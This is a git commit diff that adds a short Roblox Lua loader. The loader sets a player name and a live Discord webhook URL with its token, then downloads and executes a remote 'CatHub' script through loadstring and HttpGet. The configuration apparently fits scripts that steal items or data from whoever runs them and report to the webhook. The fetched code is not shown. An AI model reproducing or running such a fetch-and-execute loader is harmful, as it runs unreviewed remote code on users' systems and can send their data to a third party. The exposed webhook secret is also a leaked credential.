d5b4a82cb7d4e4215547499e7672acb520a78f4d
Senpaigmx <124633647+Senpaigmx@users.noreply.github.com>
2024-02-03 18:36:12 +0300

    Add files via upload

---
+++ forr.lua
@@ -0,0 +1,4 @@
+getgenv().Nicks = "foxigamer19126111"
+getgenv().Webhook = "https://discord.com/api/webhooks/1200061019972718693/vagzVUzvuuP9MNSsizWqsYWss1p0yGZIRMFhm1na42TOaEKq6DWb8pBVAXirxd8RjihZ"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Senpaigmx/CatHubV2/main/CatHub.lua"))()
